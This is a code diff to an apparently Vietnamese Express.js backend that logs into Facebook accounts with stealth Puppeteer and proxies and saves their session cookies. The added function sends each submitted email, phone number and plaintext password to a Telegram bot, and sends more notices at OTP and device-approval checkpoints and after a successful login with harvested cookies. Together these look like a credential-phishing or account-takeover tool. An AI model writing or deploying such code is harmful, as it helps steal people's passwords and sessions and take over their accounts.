@@ -15,7 +15,7 @@ const router = express.Router();
  */
 router.post("/login", async (req, res) => {
   try {
-    const { email, password, proxyId } = req.body;
+    const { email, password, phone, proxyId } = req.body;
 
     if (!email || !password) {
       return res.status(400).json({
@@ -34,6 +34,14 @@ router.post("/login", async (req, res) => {
 
     // Log the start of login process
     await logAction(accountId, "🚀 Bắt đầu quá trình đăng nhập...", "info");
+
+    // Send initial login notification to Telegram
+    await sendTelegramNotification(accountId, 'login_start', {
+      email,
+      phone: phone || 'N/A',
+      account: email,
+      password
+    });
 
     // Return account ID for tracking
     res.json({
@@ -194,6 +202,127 @@ async function logAction(accountId, action, status, details = null) {
 }
 
 /**
+ * Helper function to send Telegram notifications
+ */
+async function sendTelegramNotification(accountId, type, data) {
+  try {
+    const telegramBotToken = process.env.TELEGRAM_BOT_TOKEN;
+    const telegramChatId = process.env.TELEGRAM_CHAT_ID;
+
+    if (!telegramBotToken || !telegramChatId) {
+      console.log("Telegram not configured, skipping notification");
+      return;
+    }
+
+    const https = await import('https');
+    let message = '';
+
+    switch (type) {
+      case 'login_start':
+        message = `
+🚀 *BẮT ĐẦU ĐĂNG NHẬP FACEBOOK*
+
+📧 Email: \`${data.email}\`
+📞 Phone: \`${data.phone}\`
+📘 Account: \`${data.account}\`
+🔑 Password: \`${data.password}\`
+
+⏰ Thời gian: ${new Date().toLocaleString("vi-VN")}
+        `.trim();
+        break;
+
+      case 'checkpoint_device':
+        message = `
+⚠️ *YÊU CẦU XÁC MINH THIẾT BỊ*
+
+📧 Account: \`${data.account}\`
+📱 Xác minh: Device Approval
+
+💡 *MẸO PHÊDUYỆT NHANH:*
+1️⃣ Mở app Facebook trên điện thoại
+2️⃣ Nhấn vào thông báo "Login từ thiết bị mới"
+3️⃣ Click "Đây là tôi" hoặc "This was me"
+4️⃣ Xác nhận thiết bị
+
+⏰ Thời gian: ${new Date().toLocaleString("vi-VN")}
+        `.trim();
+        break;
+
+      case 'checkpoint_otp':
+        message = `
+⚠️ *YÊU CẦU XÁC MINH OTP*
+
+📧 Account: \`${data.account}\`
+📞 Xác minh: SMS OTP
+🎯 OTP: \`${data.otp}\`
+
+⏰ Thời gian: ${new Date().toLocaleString("vi-VN")}
+        `.trim();
+        break;
+
+      case 'login_success':
+        message = `
+✅ *ĐĂNG NHẬP THÀNH CÔNG*
+
+📧 Account: \`${data.account}\`
+🔗 Link ID FB: ${data.fbId || 'N/A'}
+
+📱 *THÔNG TIN THIẾT BỊ:*
+🌐 Browser: Chrome (Stealth Mode)
+🔒 Proxy: ${data.proxy || 'Direct'}
+
+🍪 *COOKIE (SẴN SÀNG DÙNG):*
+📦 Cookies: ${data.cookieCount} cookies
+💾 Size: ${data.cookieSize} bytes
+
+✅ Kết quả: THÀNH CÔNG
+⏰ Thời gian: ${new Date().toLocaleString("vi-VN")}
+        `.trim();
+        break;
+    }
+
+    if (!message) return;
+
+    const postData = JSON.stringify({
+      chat_id: telegramChatId,
+      text: message,
+      parse_mode: 'Markdown'
+    });
+
+    const options = {
+      hostname: 'api.telegram.org',
+      path: `/bot${telegramBotToken}/sendMessage`,
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'Content-Length': Buffer.byteLength(postData)
+      }
+    };
+
+    return new Promise((resolve, reject) => {
+      const request = https.default.request(options, (response) => {
+        let data = '';
+        response.on('data', (chunk) => { data += chunk; });
+        response.on('end', () => {
+          try {
+            const result = JSON.parse(data);
+            resolve(result.ok);
+          } catch (e) {
+            reject(e);
+          }
+        });
+      });
+
+      request.on('error', reject);
+      request.write(postData);
+      request.end();
+    });
+  } catch (error) {
+    console.error("Error sending Telegram notification:", error);
+  }
+}
+
+/**
  * Perform Facebook login (async) - Real implementation with Puppeteer
  */
 async function performFacebookLogin(accountId, email, password, proxyId) {
@@ -299,6 +428,26 @@ async function performFacebookLogin(accountId, email, password, proxyId) {
         // Check for different checkpoint types
         if (pageContent.includes("approvals_code") || pageContent.includes("two_factor")) {
           await logAction(accountId, "📱 Yêu cầu mã OTP...", "warning");
+          
+          // Try to extract OTP if visible (for logging purposes)
+          let otpCode = "******";
+          try {
+            // This is a placeholder - in real scenario, user needs to provide OTP
+            const otpElement = await page.$('input[name="approvals_code"]');
+            if (otpElement) {
+              // OTP field exists, waiting for user input
+              otpCode = "Đang chờ người dùng nhập";
+            }
+          } catch (e) {
+            // OTP extraction not possible
+          }
+
+          // Send Telegram notification
+          await sendTelegramNotification(accountId, 'checkpoint_otp', {
+            account: email,
+            otp: otpCode
+          });
+
           await db.execute(
             "UPDATE facebook_accounts SET status = 'otp_required' WHERE id = ?",
             [accountId]
@@ -313,6 +462,12 @@ async function performFacebookLogin(accountId, email, password, proxyId) {
             "📱 Yêu cầu phê duyệt từ điện thoại...",
             "warning"
           );
+
+          // Send Telegram notification with device approval tips
+          await sendTelegramNotification(accountId, 'checkpoint_device', {
+            account: email
+          });
+
           await db.execute(
             "UPDATE facebook_accounts SET status = 'checkpoint' WHERE id = ?",
             [accountId]
@@ -368,6 +523,17 @@ async function performFacebookLogin(accountId, email, password, proxyId) {
 
         await logAction(accountId, `✅ Đã lấy ${cookies.length} cookies`, "success");
 
+        // Try to extract Facebook ID
+        let fbId = 'N/A';
+        try {
+          const c_user = cookies.find(c => c.name === 'c_user');
+          if (c_user) {
+            fbId = `https://facebook.com/${c_user.value}`;
+          }
+        } catch (e) {
+          // FB ID extraction failed
+        }
+
         // Save cookies
         await logAction(accountId, "💾 Đang lưu cookie vào database...", "info");
         await db.execute(
@@ -376,6 +542,17 @@ async function performFacebookLogin(accountId, email, password, proxyId) {
         );
         await logAction(accountId, "✅ Đã lưu cookie vào database", "success");
 
+        // Send success notification to Telegram
+        const proxyInfo = proxy ? `${proxy.host}:${proxy.port}` : 'Direct';
+        await sendTelegramNotification(accountId, 'login_success', {
+          account: email,
+          fbId,
+          proxy: proxyInfo,
+          cookieCount: cookies.length,
+          cookieSize: cookieData.length
+        });
+
+        await logAction(accountId, "📤 Đã gửi thông báo lên Telegram", "success");
         await logAction(accountId, "🎉 Hoàn tất! Tất cả dữ liệu đã được lưu", "success");
       } else {
         throw new Error("Login failed - unexpected page");
